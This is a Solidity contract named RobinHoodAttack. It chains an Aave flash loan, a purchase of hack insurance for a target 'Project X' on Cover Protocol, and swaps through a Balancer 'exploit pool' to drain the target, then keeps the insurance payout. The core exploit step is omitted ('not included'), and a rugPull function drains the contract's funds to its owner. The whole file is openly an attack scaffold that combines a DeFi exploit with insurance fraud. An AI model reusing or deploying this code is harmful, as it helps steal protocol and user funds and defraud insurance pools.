pragma solidity 0.6.12;

// Aave V2 dependencies
import { FlashLoanReceiverBase } from "FlashLoanReceiverBase.sol";
import { ILendingPool, ILendingPoolAddressesProvider, IERC20 } from "Interfaces.sol";

// Balancer dependencies
import "IBalancerPool.sol";
import "IBalancerToken.sol";

// generic dependencies
import { SafeMath } from "Libraries.sol";
import "Ownable.sol";

/*
* A contract that executes the following logic in a single atomic transaction:
*
*   1. Executes a DAI/sUSD batch flashloan on Aave
*   2. Uses DAI batch to short the SC security of Project X by buying up hack insurance from Cover Protocol
*   3. Uses sUSD batch to 'interact' with Project X
*   4. Repays the flash loan using gains from 'interacting' with Project X
*   
*   After that you can just sit back and wait for the insurance payout from Cover Protocol
*   Then philanthropically return surplus 'interaction' funds back to Project X
*   [Optional] Ask Project X for grey hat bounty
*/
contract RobinHoodAttack is FlashLoanReceiverBase, Ownable {
    
    using SafeMath for uint256;
    
    // Aave V2 variables
    ILendingPoolAddressesProvider provider;
    address lendingPoolAddr;
    uint256 flashDaiAmt;
    uint256 flashsUSDAmt;
    
    // Balancer interfaces
    uint256 exploitVolume;
    uint256 coverAmtInDai;
    IBalancerInterface public balancerPool;
    IBalancerToken public bDaiToken;
    IBalancerToken public claimToken;
    
    // Kovan reserve assets
    address kovanDai = 0xFf795577d9AC8bD7D90Ee22b6C1703490b6512FD;
    address kovansUSD = 0x99b267b9D96616f906D53c26dECf3C5672401282;
    address kovanCLAIM = 0xad5D3F865E807F31F99609FaE89d9eF1908dAC1e;
    address kovanExploitPool = 0x97c37c7Ff09C92650aa1ff9F35864fe15ab86A9F;
    
    // initialize lending pool addresses provider and get lending pool address
    // initialize insurance pool on Balancer
    constructor(
        ILendingPoolAddressesProvider _addressProvider,
        IBalancerInterface _insurancePool
        ) FlashLoanReceiverBase(
            _addressProvider
        ) public {
        provider = _addressProvider;
        lendingPoolAddr = provider.getLendingPool();
        balancerPool = _insurancePool;
    }

    /**
     *  Mid flash logic i.e. what you do with the temporarily acquired liquidity
     */
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        external
        override
        returns (bool)
    {
        
        // acquire long position on hack insurance cover for Project x
        obtainHackCoverage(coverAmtInDai);
        
        // 'interact' with Project x using the sUSD batch
        interactWithProjectX(exploitVolume);
                interactWithProjectX(exploitVolume);
                        interactWithProjectX(exploitVolume);
        
        // Approve the LendingPool contract allowance to *pull* the owed amount
        // i.e. AAVE V2's way of repaying the flash loan
        for (uint i = 0; i < assets.length; i++) {
            uint amountOwing = amounts[i].add(premiums[i]);
            IERC20(assets[i]).approve(address(_lendingPool), amountOwing);
        }

        return true;
    }

    // enter a long position for a CLAIM event on Project X @ $0.02 per cover token
    // Upon a hack event the cover tokens expire to $1
    function obtainHackCoverage(uint _daiAmount) public payable {
        
        // Balancer kovan tokens
        claimToken = IBalancerToken(address(kovanCLAIM));
        bDaiToken = IBalancerToken(address(kovanDai));

        IBalancerToken(bDaiToken).approve(address(balancerPool), _daiAmount);

        IBalancerInterface(balancerPool).swapExactAmountOut(
            address(bDaiToken),
            type(uint).max, // set max to all available DAI on contract
            address(claimToken),
            _daiAmount,
            type(uint).max // accept any swap prices (don't use this in prod)
        );
    }
    
    /**
    * Magic
    **/
    function interactWithProjectX(uint _sUSDAmount) public payable {
        
        /*
        ******* at this point the dodgy token is already in the exploit pool  *****
        */
        
        // instantiate exploit pool
        IBalancerInterface exploitPool = IBalancerInterface(address(kovanExploitPool));
        IBalancerToken balSUSD = IBalancerToken(address(kovansUSD));
        //IBalancerToken balDai = IBalancerToken(address(kovanDai));
        IBalancerToken(balSUSD).approve(address(exploitPool), _sUSDAmount);
        
        /*
        ******* some other magic happens here (not included) with Bonding Surfaces *****
        */
        
        // and finally complete the 'arb' action
        IBalancerInterface(exploitPool).swapExactAmountOut(
            address(kovansUSD),
            type(uint).max, // set max to total sUSD on contract
            address(kovanDai),
            _sUSDAmount,
            type(uint).max // accept any swap prices (don't use this in prod)
        );
    }

    /*
    * Rugpull yourself to drain all ERC20 tokens from the contract
    */
    function rugPull() public payable onlyOwner {
        
        // withdraw all ETH
        msg.sender.call{ value: address(this).balance }("");
        
        // withdraw all x ERC20 tokens
        IERC20(kovanDai).transfer(msg.sender, IERC20(kovanDai).balanceOf(address(this)));
        IERC20(kovansUSD).transfer(msg.sender, IERC20(kovansUSD).balanceOf(address(this)));
        IERC20(kovanCLAIM).transfer(msg.sender, IERC20(kovanCLAIM).balanceOf(address(this)));

    }

    /*
    * Entry point function to commence the flash loan sequence
    */
    function executeFlashLoans(
        uint256 _flashDaiAmt,
        uint256 _flashsUSDAmt,
        uint256 _coverAmtInDai,
        uint256 _exploitVolume
        ) public onlyOwner {
        
        //direct flash liquidity to this contract    
        address receiverAddress = address(this);
        
        // the various assets to be flashed
        address[] memory assets = new address[](2);
        assets[0] = kovanDai; 
        assets[1] = kovansUSD;

        // the amount to be flashed for each asset
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = _flashDaiAmt;
        amounts[1] = _flashsUSDAmt;
        
        // set to global visibility for use in executeOperation()
        flashDaiAmt = _flashDaiAmt;
        flashsUSDAmt = _flashsUSDAmt;
        coverAmtInDai = _coverAmtInDai;
        exploitVolume = _exploitVolume;
        
        // 0 = no debt, 1 = stable, 2 = variable
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;

        _lendingPool.flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }
}
